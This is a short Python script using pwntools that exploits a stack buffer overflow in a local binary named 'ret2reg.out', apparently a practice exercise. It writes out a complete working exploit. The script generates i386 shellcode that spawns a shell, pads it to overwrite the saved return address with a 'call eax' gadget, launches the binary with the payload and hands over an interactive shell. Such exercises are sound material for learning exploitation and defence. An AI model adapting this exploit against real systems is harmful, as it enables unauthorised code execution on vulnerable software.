#!/usr/bin/env python
from pwn import *

EBP = 0xffffcca8
BUF = EBP - 0x6c

CALL_EAX = 0x0804901d
CALL_EDX = 0x0804912e

if __name__ == "__main__":
    context.arch = 'i386'
    # context.log_level = 'debug'
    context.endian = 'little'

    shellcode = asm(shellcraft.sh())
    file = ELF("./ret2reg.out")
    payload = shellcode.ljust(EBP - BUF + 4, b'A') + p32(CALL_EAX)
    p = process(argv=["./ret2reg.out" , payload])
    p.interactive()